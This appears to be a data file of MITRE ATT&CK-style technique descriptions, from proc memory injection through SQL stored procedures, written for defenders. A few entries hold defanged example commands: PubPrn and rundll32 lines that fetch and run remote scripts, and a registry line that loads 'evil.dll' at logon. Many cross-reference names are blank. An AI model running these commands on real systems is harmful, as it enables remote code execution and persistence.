Proc Memory,"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. Proc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes memory map within /proc/[pid]/maps can be overwritten using dd. Other techniques such as  may be used to populate a target process with more available gadgets. Similar to , proc memory injection may target child processes (such as a backgrounded copy of sleep). Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. ",technique
Process Discovery,"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.In Windows environments, adversaries could obtain details on running processes using the  utility via  or Get-Process via . Information about processes can also be extracted from the output of  calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.",technique
Process Doppelgänging,"Adversaries may inject malicious code into process via process doppelgnging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgnging is a method of executing arbitrary code in the address space of a separate live process. Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.  To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.  To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. Adversaries may abuse TxF to a perform a file-less variation of . Similar to , process doppelgnging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgnging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. Process Doppelgnging is implemented in 4 steps :* Transact  Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.* Load  Create a shared section of memory and load the malicious executable.* Rollback  Undo changes to original executable, effectively removing malicious code from the file system.* Animate  Create a process from the tainted section of memory and initiate execution.This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgnging may evade detection from security products since the execution is masked under a legitimate process. ",technique
Process Hollowing,"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.This is very similar to  but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",technique
Process Injection,"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",technique
Protocol Impersonation,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ",technique
Protocol Tunneling,"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.  may also be abused by adversaries during . Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. Adversaries may also leverage  in conjunction with  and/or  to further conceal C2 communications and infrastructure. ",technique
Proxy,"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including , ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",technique
Ptrace System Calls,"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: malloc) then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute. Ptrace system call injection can also be done with PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes memory (ex: the current address of the next instruction).  Ptrace system call injection may not be possible targeting processes with high-privileges, and on some system those that are non-child processes. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. ",technique
PubPrn,Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site. An example command is cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png.,technique
Purchase Technical Data,"Before compromising a victim, adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victims infrastructure. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",technique
Query Registry,"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.The Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the  utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",technique
RDP Hijacking,"Adversaries may hijack a legitimate users remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe  and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.",technique
ROMMONkit,"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to , an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",technique
Rc.common,"Adversaries may use rc.common automatically executed at boot initialization to establish persistence. During the boot process, macOS executes source /etc/rc.common, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings and is thus recommended to include in the start of Startup Item Scripts . In macOS and OS X, this is now a deprecated mechanism in favor of  and  but is currently still used.Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user. ",technique
Re-opened Applications,"Adversaries may modify plist files to automatically run an application when a user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user logs into their machine after reboot. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at ~/Library/Preferences/com.apple.loginwindow.plist and ~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist. An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine .",technique
Reduce Key Space,"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.Adversaries may modify the key size used and other encryption parameters using specialized commands in a  introduced to the system through  to change the configuration of the device. ",technique
Redundant Access,"**This technique has been deprecated. Please use , , and  where appropriate.**Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to  to use  such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network. Adversaries may also retain access through cloud-based infrastructure and applications.Use of a  is one such way to maintain access to a network through an externally accessible Web server.",technique
Reflection Amplification,"Adversaries may attempt to cause a denial of service by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflector may be used to focus traffic on the target.Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS and NTP, though the use of several others in the wild have been documented.  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.",technique
Registry Run Keys / Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  These programs will be executed under the context of the user and will have the account's associated permissions level.Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. The startup folder path for all users is C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp.The following run keys are created by default on Windows systems:* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.  For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll"" The following Registry keys can be used to set startup folder items for persistence:* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell FoldersThe following Registry keys can control automatic startup of services during boot:* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RunThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell subkeys can automatically launch programs.Programs listed in the load value of the registry key HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows run when any user logs on.By default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  to make the Registry entries look as if they are associated with legitimate programs.",technique
Regsvcs/Regasm,Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET  (COM) assemblies. Both are digitally signed by Microsoft.  Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. ,technique
Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a ""Squiblydoo"" attack and has been used in campaigns targeting governments.  Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via . ",technique
Remote Access Software,"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. Remote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.  ",technique
Remote Data Staging,"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as . Interactive command shells may be used, and common functionality within  and bash may be used to copy data into a staging location.In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may  and stage data in that instance.By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",technique
Remote Desktop Protocol,Adversaries may use  to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the  technique for Persistence.,technique
Remote Email Collection,Adversaries may target an Exchange server or Office 365 to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as  can be used to automate searches for specific keywords.,technique
Remote Service Session Hijacking,"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.Adversaries may commandeer these sessions to carry out actions on remote systems.  differs from use of  because it hijacks an existing session rather than creating a new session using .",technique
Remote Services,"Adversaries may use  to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).",technique
Remote System Discovery,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as   or net view using . Adversaries may also use local host files (ex: C:\Windows\System32\Drivers\etc\hosts or /etc/hosts) in order to discover the hostname to IP address mappings of remote systems. Specific to macOS, the bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.",technique
Rename System Utilities,Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename rundll32.exe).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. ,technique
Replication Through Removable Media,"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.",technique
Resource Hijacking,"Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.",technique
Revert Cloud Instance,"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.",technique
Right-to-Left Override,"Adversaries may use the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png.A common use of this technique is with / since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",technique
Rogue Domain Controller,"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).  The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform  and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. ",technique
Rootkit,"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.  Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or .  Rootkits have been seen for Windows, Linux, and Mac OS X systems.  ",technique
Run Virtual Instance,"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.",technique
Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.Rundll32.exe can also be used to execute  Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""  This behavior has been seen used by malware such as Poweliks. ",technique
Runtime Data Manipulation,"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct  and  to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",technique
SID-History Injection,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).With Domain Administrator (or equivalent) rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as , , or .",technique
SIP and Trust Provider Hijacking,"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs). Similar to , adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: * Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID} that point to the dynamic link library (DLL) providing a SIPs CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the files real signature, an adversary can apply an acceptable signature value to all files using that SIP  (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).* Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID} that point to the DLL providing a SIPs CryptSIPDllVerifyIndirectData function, which validates a files computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.* Modifying the DLL and Function Registry values in HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID} that point to the DLL providing a trust providers FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIPs CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).* **Note:** The above hijacks are also possible without modifying the Registry via .Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. ",technique
SMB/Windows Admin Shares,"Adversaries may use  to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level  to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are , , and . Adversaries can also use NTLM hashes to access administrator shares on systems with  and certain configuration and patch levels.",technique
SNMP (MIB Dump),"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages. The MIB may also contain device operational information, including running configuration, routing table, and interface details.Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation. ",technique
SQL Stored Procedures,"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server. Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands. ",technique
